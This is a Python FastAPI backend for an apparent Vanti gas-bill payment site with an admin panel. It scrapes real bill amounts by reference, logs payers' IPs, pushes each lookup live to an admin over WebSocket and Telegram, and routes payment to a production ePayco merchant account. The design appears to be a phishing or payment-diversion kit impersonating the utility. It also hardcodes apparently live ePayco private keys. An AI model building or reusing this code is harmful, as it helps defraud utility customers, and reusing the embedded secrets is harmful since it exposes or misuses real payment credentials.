import sys
import asyncio
import os
import random
import shutil
import json
import time
import hashlib
import requests
from typing import List

# Credenciales ePayco (Producción)
EPAYCO_PUBLIC_KEY = "24da23d756446dcd468753da3db0aea4"          # Copias el valor de PUBLIC_KEY
EPAYCO_P_CUST_ID_CLIENT = "1594891"    # Copias el valor de P_CUST_ID_CLIENTE
EPAYCO_P_KEY = "e934b987624597d78a2ad09aaf880a8babce2636"                    # Copias el valor de P_KEY
EPAYCO_PRIVATE_KEY = "c40c89c21f5f056e15cf94f3d62d7b41"        # Copias el valor de PRIVATE_KEY (opcional para API backend)

EPAYCO_TEST_MODE = "false"                        # "false" porque estás en Producción

# 1. Configurar política de Event Loop para Windows ANTES de iniciar tareas asíncronas
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

from fastapi import FastAPI, Request, Form, WebSocket, WebSocketDisconnect, UploadFile, File, HTTPException, Depends
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from app.database import (
    init_db, guardar_transaccion, actualizar_estado_transaccion,
    obtener_transaccion, obtener_todas_transacciones, obtener_metricas,
    bloquear_ip, es_ip_bloqueada, guardar_otp_admin, verificar_otp_admin
)

from app.vanti_scraper import consultar_factura_vanti
from app.telegram_utils import enviar_mensaje_telegram

# 2. Inicializar la aplicación FastAPI
app = FastAPI(title="Sistema Vanti & Panel Admin")

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
STATIC_DIR = os.path.join(BASE_DIR, "static")

# Inicializar Base de Datos SQLite
init_db()

# Montar archivos estáticos y plantillas
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="app/templates")

# Gestor de conexiones WebSockets para el Panel Admin local
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                pass

manager = ConnectionManager()

# Helper para obtener IP del cliente
def get_client_ip(request: Request) -> str:
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0]
    return request.client.host or "127.0.0.1"

# Middleware para bloqueo de IP
@app.middleware("http")
async def check_ip_blocking(request: Request, call_next):
    ip = get_client_ip(request)
    if es_ip_bloqueada(ip) and not request.url.path.startswith("/static"):
        return HTMLResponse("<h1>403 Acceso Denegado - Su IP ha sido bloqueada.</h1>", status_code=403)
    response = await call_next(request)
    return response

# --- RUTAS PÚBLICAS (CLIENTE) ---

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse(
        request=request, name="index.html", context={"error": None}
    )

@app.get("/pagar-demo", response_class=HTMLResponse)
async def pagar_demo(request: Request, referencia: str = "61743859", monto: float = 100000):
    """Ruta de prueba: crea una transacción y muestra el checkout con ePayco."""
    tx_id = guardar_transaccion("79", referencia, monto, get_client_ip(request))
    ref_epayco = f"{referencia}-{tx_id}"
    
    return templates.TemplateResponse(
        request=request, name="checkout.html",
        context={
            "tx_id": tx_id,
            "referencia": referencia,
            "monto": int(monto),
            "empresa": "79",
            "ref_epayco": ref_epayco,
            "epayco_public_key": EPAYCO_PUBLIC_KEY,
            "epayco_p_cust_id": EPAYCO_P_CUST_ID_CLIENT,
            "epayco_test": EPAYCO_TEST_MODE
        }
    )

@app.post("/actividad/{tx_id}")
async def actividad(tx_id: int):
    return {"status": "ok"}

@app.post("/consultar", response_class=HTMLResponse)
async def consultar(
    request: Request, 
    empresa: str = Form(...), 
    referencia: str = Form(...),
    metodo_pago: str = Form("pse")
):
    ip = get_client_ip(request)
    
    # Ejecutar Scraper de Vanti
    resultado = await consultar_factura_vanti(empresa, referencia)
    
    if not resultado.get("success"):
        return templates.TemplateResponse(
            request=request, name="index.html",
            context={"error": resultado.get("message", "Error al consultar la referencia.")}
        )
    
    # Guardar en Base de Datos
    monto = float(resultado.get("amount", 0))
    tx_id = guardar_transaccion(empresa, referencia, monto, ip)

    tx = obtener_transaccion(tx_id)
    metricas = obtener_metricas()

    # Notificar al admin por WebSocket
    await manager.broadcast({
        "event": "NUEVA_CONSULTA",
        "tx": tx,
        "metricas": metricas
    })

    # Redirección según método elegido
    if metodo_pago == "llave":
        return templates.TemplateResponse(
            request=request, name="checkout_llave.html",
            context={
                "tx_id": tx_id,
                "referencia": referencia,
                "monto": int(monto),
                "empresa": empresa
            }
        )

    # Flujo por defecto (PSE): mostrar pasarela de pago ePayco
    ref_epayco = f"{referencia}-{tx_id}"
    return templates.TemplateResponse(
        request=request, name="checkout.html",
        context={
            "tx_id": tx_id,
            "referencia": referencia,
            "monto": int(monto),
            "empresa": empresa,
            "ref_epayco": ref_epayco,
            "epayco_public_key": EPAYCO_PUBLIC_KEY,
            "epayco_p_cust_id": EPAYCO_P_CUST_ID_CLIENT,
            "epayco_test": EPAYCO_TEST_MODE
        }
    )